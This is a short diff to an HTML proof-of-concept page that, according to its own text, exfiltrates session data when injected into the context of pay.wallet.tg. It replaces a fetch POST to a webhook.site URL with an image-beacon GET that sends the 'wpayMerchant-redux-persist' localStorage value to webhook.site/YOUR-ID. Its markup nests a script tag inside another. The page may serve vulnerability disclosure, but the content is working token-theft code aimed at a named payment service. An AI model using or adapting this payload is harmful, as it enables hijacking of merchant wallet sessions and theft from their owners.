@@ -9,15 +9,12 @@
   <p>If this page is injected into the context of <code>pay.wallet.tg</code>, it will exfiltrate the session data via a GET request.</p>
 
   <script>
-fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    localStorage: localStorage.getItem('wpayMerchant-redux-persist')
-  })
-})
-.then(res => console.log("Exfil success:", res))
-.catch(err => console.error("Exfil failed:", err));
+<script>
+  const data = encodeURIComponent(localStorage.getItem('wpayMerchant-redux-persist'));
+  const i = new Image();
+  i.src = "https://webhook.site/YOUR-ID?data=" + data;
+</script>
+
   </script>
 </body>
 </html>
